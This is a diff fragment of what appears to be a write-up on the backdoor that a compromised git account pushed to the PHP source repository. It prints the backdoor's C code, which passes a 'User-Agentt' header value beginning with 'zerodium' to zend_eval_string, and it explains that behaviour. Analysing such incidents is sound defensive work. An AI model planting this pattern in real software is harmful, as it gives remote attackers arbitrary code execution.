@@ -10,19 +10,20 @@ A compromised git account pushed code to the PHP source repository introducing a
 
 ```c
 {
-	zval zoh;
-	php_output_handler *h;
-	zval *enc;
+    zval zoh;
+    php_output_handler *h;
+    zval *enc;
 
-	if ((Z_TYPE(PG(http_globals)[TRACK_VARS_SERVER]) == IS_ARRAY || zend_is_auto_global_str(ZEND_STRL("_SERVER"))) &&
-		(enc = zend_hash_str_find(Z_ARRVAL(PG(http_globals)[TRACK_VARS_SERVER]), "HTTP_USER_AGENTT", sizeof("HTTP_USER_AGENTT") - 1))) {
-		convert_to_string(enc);
-		if (strstr(Z_STRVAL_P(enc), "zerodium")) {
-			zend_try {
-				zend_eval_string(Z_STRVAL_P(enc)+8, NULL, "REMOVETHIS: sold to zerodium, mid 2017");
-			} zend_end_try();
-		}
-	}
+    if ((Z_TYPE(PG(http_globals)[TRACK_VARS_SERVER]) == IS_ARRAY || zend_is_auto_global_str(ZEND_STRL("_SERVER"))) &&
+        (enc = zend_hash_str_find(Z_ARRVAL(PG(http_globals)[TRACK_VARS_SERVER]), "HTTP_USER_AGENTT", sizeof("HTTP_USER_AGENTT") - 1))) {
+        convert_to_string(enc);
+        if (strstr(Z_STRVAL_P(enc), "zerodium")) {
+            zend_try {
+                zend_eval_string(Z_STRVAL_P(enc)+8, NULL, "REMOVETHIS: sold to zerodium, mid 2017");
+            } zend_end_try();
+        }
+    }
+}
 ```
 
 This code evaluates a string contained in the `User-Agentt` header if this string starts with `zerodium`.
